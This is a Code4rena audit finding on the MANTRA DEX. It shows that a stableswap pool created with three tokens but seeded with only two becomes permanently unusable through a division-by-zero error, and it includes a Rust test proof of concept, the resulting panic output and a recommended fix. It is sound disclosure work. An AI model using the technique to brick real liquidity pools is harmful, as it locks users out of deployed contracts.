---
tags:
  - severity/high
  - has/github
  - has/poc
  - lang/solidity
  - lang/rust
  - sector/bridge
  - sector/dex
  - platform/code4rena
protocol: "[[MANTRA]]"
auditors:
  - carrotsmuggler
report: "https://code4rena.com/reports/2024-11-mantra-dex"
genome:
  - "[[integer-bounds]]"
  - "[[input-validation/boundary]]"
  - "[[dos/permanent]]"
  - "[[known-pattern]]"
  - "[[first-deposit]]"
  - "[[add-check]]"
  - "[[blast-radius/single-pool]]"
---
# [H-03] Multi-token stableswap pools allow `0` liquidity for tokens, creating bricked pools

- id: 54979
- impact: HIGH
- protocol: MANTRA
- reporter: carrotsmuggler (Code4rena)
- source: https://code4rena.com/reports/2024-11-mantra-dex

## Summary


This bug report is about a problem with the stableswap pools in the code for the 2024-11-mantra-dex project. The issue is that the initial `provide_liquidity` function does not check if all tokens are provided when creating a pool. This means that if only two out of three tokens are provided, the transaction will still go through but the pool will be broken and no further liquidity can be added. This is because the code does not prevent a division by zero error in the `d_prod` calculation. A proof of concept has been provided to show how this bug can be replicated. The recommended solution is to add a check to make sure that all tokens are provided when creating a pool with zero total supply. 

## Details



[/contracts/pool-manager/src/liquidity/commands.rs# L46-L74](https://github.com/code-423n4/2024-11-mantra-dex/blob/26714ea59dab7ecfafca9db1138d60adcf513588/contracts/pool-manager/src/liquidity/commands.rs# L46-L74)

[/contracts/pool-manager/src/liquidity/commands.rs# L234-L239](https://github.com/code-423n4/2024-11-mantra-dex/blob/26714ea59dab7ecfafca9db1138d60adcf513588/contracts/pool-manager/src/liquidity/commands.rs# L234-L239)

### Finding description and impact

The stableswap pools allow anyone to create pools following the stableswap formula with any number of tokens. This can be higher than 2. The issue is that the initial `provide_liquidity` does not check if ALL tokens are provided.

The `provide_liquidity` function does a number of checks. For the ConstantProduct pools, the constant product part uses both `deposits[0]` and `deposits[1]` to calculate the initial number of shares, and uses a product of the two. So anyone being absent or 0 leads to reverts during the initial liquidity addition itself.

However, the stableswap pools do not check if the initial liquidity provided is non-zero for all the tokens. So if only 2 of the three tokens are provided, the transaction still goes through. The only check is that all the passed in tokens must be pool constituents.
```

ensure!(
        deposits.iter().all(|asset| pool_assets
            .iter()
            .any(|pool_asset| pool_asset.denom == asset.denom)),
        ContractError::AssetMismatch
    );
```

This leads to a broken pool, where further liquidity cannot be added anymore. This is because the pool is saved in a state where the pool has 0 liquidity for one of the tokens. Then in future liquidity additions, `amount_times_coins` value evaluates to 0 for those tokens, which eventually leads to a division by zero error in `d_prod` calculation.
```

let amount_times_coins: Vec<Uint128> = deposits
    .iter()
    .map(|coin| coin.amount.checked_mul(n_coins).unwrap())
    .collect();

// ...

for _ in 0..256 {
    let mut d_prod = d;
    for amount in amount_times_coins.clone().into_iter() {
        d_prod = d_prod
            .checked_mul(d)
            .unwrap()
            .checked_div(amount.into()) //@audit division by zero
            .unwrap();
// ...
```

Thus this leads to a broken pool and there is nothing in the contract preventing this.

### Proof of Concept

Attached is a POC where a pool is created with 3 tokens [`uwhale,uluna,uusd`] but only 2 tokens are provided in the initial liquidity addition [`uwhale, ulune`]. Further liquidity additions revert due to division by zero error.
```

fn multiswap_test() {
    let mut suite = TestingSuite::default_with_balances(
        vec![
            coin(1_000_000_001u128, "uwhale".to_string()),
            coin(1_000_000_000u128, "uluna".to_string()),
            coin(1_000_000_001u128, "uusd".to_string()),
            coin(1_000_000_001u128, "uom".to_string()),
        ],
        StargateMock::new("uom".to_string(), "8888".to_string()),
    );
    let creator = suite.creator();
    let _other = suite.senders[1].clone();
    let _unauthorized = suite.senders[2].clone();

    let asset_infos = vec![
        "uwhale".to_string(),
        "uluna".to_string(),
        "uusd".to_string(),
    ];

    // Protocol fee is 0.01% and swap fee is 0.02% and burn fee is 0%
    let pool_fees = PoolFee {
        protocol_fee: Fee {
            share: Decimal::from_ratio(1u128, 1000u128),
        },
        swap_fee: Fee {
            share: Decimal::from_ratio(1u128, 10_000_u128),
        },
        burn_fee: Fee {
            share: Decimal::zero(),
        },
        extra_fees: vec![],
    };

    // Create a pool
    suite.instantiate_default().create_pool(
        &creator,
        asset_infos,
        vec![6u8, 6u8, 6u8],
        pool_fees,
        PoolType::StableSwap { amp: 100 },
        Some("whale.uluna.uusd".to_string()),
        vec![coin(1000, "uusd"), coin(8888, "uom")],
        |result| {
            result.unwrap();
        },
    );

    // Add liquidity with only 2 tokens
    suite.provide_liquidity(
        &creator,
        "o.whale.uluna.uusd".to_string(),
        None,
        None,
        None,
        None,
        vec![
            Coin {
                denom: "uwhale".to_string(),
                amount: Uint128::from(1_000_000u128),
            },
            Coin {
                denom: "uluna".to_string(),
                amount: Uint128::from(1_000_000u128),
            },
        ],
        |result| {
            result.unwrap();
        },
    );
}
```

The above test passes, showing liquidity can be added with 2 tokens only. Further liquidity provision reverts.
```

// Add liquidity again
suite.provide_liquidity(
    &creator,
    "o.whale.uluna.uusd".to_string(),
    None,
    None,
    None,
    None,
    vec![
        Coin {
            denom: "uwhale".to_string(),
            amount: Uint128::from(1_000_000u128),
        },
        Coin {
            denom: "uluna".to_string(),
            amount: Uint128::from(1_000_000u128),
        },
    ],
    |result| {
        result.unwrap();
    },
);
```

Output:
```

thread 'tests::integration_tests::provide_liquidity::multiswap_test' panicked at contracts/pool-manager/src/helpers.rs:737:22:
called `Result::unwrap()` on an `Err` value: DivideByZeroError
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
test tests::integration_tests::provide_liquidity::multiswap_test ... FAILED
```

### Recommended mitigation steps

Add a check to make sure if total `supply=0`, every token of the pool is provided as liquidity.

**jvr0x (MANTRA) confirmed**

---


